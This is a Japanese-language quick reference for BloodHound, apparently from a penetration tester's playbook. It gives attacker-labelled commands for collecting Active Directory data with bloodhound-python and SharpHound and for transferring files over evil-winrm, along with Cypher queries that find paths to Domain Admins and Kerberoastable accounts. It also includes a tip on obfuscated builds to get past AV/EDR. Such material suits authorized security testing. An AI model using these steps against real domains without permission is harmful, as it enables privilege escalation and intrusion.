# BloodHound クイックリファレンス

> **スコープ**: Active Directory の権限関係（ACE）をグラフで可視化するツール。「現在のユーザーから Domain Admin までの最短ルート」を視覚的に把握できる。AD 環境での調査では**最初に必ず実行する**。

## 着火条件

- AD 環境に認証情報を持って侵入した直後（Windows シェルの有無を問わない）
- BloodHound のデータなしで ACE Abuse / Kerberoast 等の手法を選択しようとしている
- 権限昇格パスを特定したいが何が使えるか不明な状態

## 環境前提

- 実行環境: テスター端末（Linux）または Windows シェル内
- 必要なツール（どちらか選ぶ）:
  - `bloodhound-python`（Linux コレクター。`pip install bloodhound` で取得。ペネトレ用 Linux ディストリで標準搭載の場合あり）
  - `SharpHound.exe`（Windows コレクター。BloodHound GitHub の Collectors/ または SharpHound Releases から取得）
  - `neo4j`・`bloodhound`（GUI 分析用。ペネトレ用 Linux ディストリ標準搭載）
- オフライン環境: `bloodhound-python` は DC への LDAP アクセスが必要（ネットワーク内なら可）

---

## データ収集の選択

**2つのコレクター方式があり、手元の状況で使い分ける：**

| 状況 | 使うコレクター |
|------|--------------|
| Windowsシェルをまだ取っていない（認証情報だけある） | `bloodhound-python`（Linux側から実行） |
| evil-winrm等でWindowsシェルを取得済み | `SharpHound.exe`（Windows上で実行）|

Windowsシェルがある場合は SharpHound のほうが収集精度が高い（SMB 経由でドメイン情報を取るため）。
認証情報だけある段階では `bloodhound-python` で先に全体像を掴むことが多い。

---

---

## 1. bloodhound-python（Linux 側コレクター）

**コマンド:**

```bash
# [Attacker] 全データを収集（最も確実）
bloodhound-python \
  -u [USER] \
  -p '[PASSWORD]' \
  -ns [DC_IP] \
  -d [DOMAIN] \
  -c All \
  --zip

# [Attacker] 収集項目を指定する場合
bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] \
  -c Users,Groups,Computers,ACL,Trusts
```

**出力:** JSON ファイル群（または `--zip` でzip圧縮）が生成される。

---

---

## 2. SharpHound.exe（Windows シェル内コレクター）

evil-winrm / psexec / RDP 等で Windows シェルを取得済みの場合。Linux 側コレクターより収集精度が高い（SMB 経由でドメイン情報を取るため）。

**コマンド:**

**Step 1: SharpHound.exe を転送**

SharpHound.exe は BloodHound の GitHub リポジトリ（`BloodHoundAD/BloodHound`）の `Collectors/` ディレクトリに同梱されている。
または `BloodHoundAD/SharpHound` リポジトリの Releases ページから単体で取得できる。

```bash
# [Attacker] evil-winrm セッションから（ローカルに SharpHound.exe がある状態で実行）
upload SharpHound.exe
```

**Step 2: Windows上で実行する**

```powershell
# [Target] SharpHound を実行（全コレクション）
.\SharpHound.exe -c All

# [Target] 出力先ディレクトリを指定する場合
.\SharpHound.exe -c All --outputdirectory C:\Windows\Temp\
```

実行が完了すると同ディレクトリに `[日時]_BloodHound.zip` が生成される。

**Step 3: 結果をダウンロードする**

```bash
# [Attacker] evil-winrm セッションから zip をダウンロード
download [日時]_BloodHound.zip
```

**Step 4: BloodHound GUI にインポートする**

GUI の「Upload Data」ボタンからzipファイルをドラッグ＆ドロップ、またはインポートする。

---

## BloodHound GUI の使い方

### 起動

```bash
# neo4j を起動
sudo neo4j start

# BloodHound GUI を起動
bloodhound &
```

### データのインポート

GUI で「Upload Data」ボタンから JSON または zip ファイルをインポート。

---

## 調査で最初に確認するクエリ

| クエリ名 | 用途 |
|---------|------|
| **Shortest Paths to Domain Admins** | 現環境から DA への最短ルートを確認 |
| **Find All Domain Admins** | DA メンバーの把握 |
| **Find Principals with DCSync Rights** | DCSync 可能なアカウントを探す |
| **Find All Paths from Domain Users to High Value Targets** | 一般ユーザーからの昇格ルート |
| **Shortest Paths to Unconstrained Delegation Systems** | Unconstrained Delegation が設定されたシステム |

---

## 特定ノードの ACE を確認する手順

1. 検索バーで対象ユーザーまたはグループを検索
2. ノードをクリック → 右パネルで詳細を確認
3. 「Outbound Object Control」→ このユーザーが制御できるオブジェクト
4. 「Inbound Object Control」→ このオブジェクトを制御できるプリンシパル

---

## Custom Cypher クエリ（検索バーに貼り付けて使用）

**現在のユーザーからDAへの全パスを検索：**
```cypher
MATCH p=shortestPath((u:User {name:"[USER@DOMAIN.COM]"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@[DOMAIN.COM]"}))
RETURN p
```

**GenericAll を持つ全プリンシパルを検索：**
```cypher
MATCH p=(n)-[:GenericAll]->(m) RETURN p LIMIT 25
```

**SPN 付きユーザーを検索（Kerberoastable）：**
```cypher
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames
```

**事前認証不要ユーザーを検索（ASREPRoastable）：**
```cypher
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
```

---

## 刺さらなかったとき

| 状況 | 原因・対処 |
|------|-----------|
| `bloodhound-python` で `Access Denied` | DNS / LDAP アクセス失敗。`/etc/hosts` に DC を登録して `-ns [DC_IP]` を明示する |
| SharpHound が `Access Denied` / `Exception` | AV / EDR に検知されている可能性。`-c DCOnly` で DC 情報のみ先に収集、または `bloodhound-python` に切り替える |
| 実行が途中で止まる | ドメインへの接続が切れている。`-d [DOMAIN] --domaincontroller [DC_IP]` を明示して再試行 |
| zip が空・データが少ない | 実行ユーザーの権限不足。`-c DCOnly` で DC 情報のみ先に収集して状況を把握する |

---

## 注意点・落とし穴

- `bloodhound-python` は DC への接続が必要なため、名前解決の設定（`/etc/hosts` や `-ns` オプション）が重要
- 大規模なドメインでは収集に時間がかかるため、`-c DCOnly` で DC 情報のみ先に取得する方法もある
- BloodHound の情報は収集時点のスナップショットのため、ACE の変更後は再収集が必要
- SharpHound.exe は多くのAV/EDRで検知されるため、本番では事前合意と回避策（難読化ビルド等）を検討する

---

## 関連技術
- 前：認証情報を取得してWindowsシェルを取得した → `../02_Initial_Access/WinRM.md` / `../02_Initial_Access/Impacket_Exec.md`
- 後（GenericAll 発見） → `../04_Post_Access_Windows_AD/ACE_Abuse/GenericAll.md`
- 後（GenericWrite 発見） → `../04_Post_Access_Windows_AD/ACE_Abuse/GenericWrite.md`
- 後（WriteDACL 発見） → `../04_Post_Access_Windows_AD/ACE_Abuse/WriteDACL.md`
- 後（ForceChangePassword 発見） → `../04_Post_Access_Windows_AD/ACE_Abuse/ForcePasswordChange.md`
- 後（Kerberoastable発見） → `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`
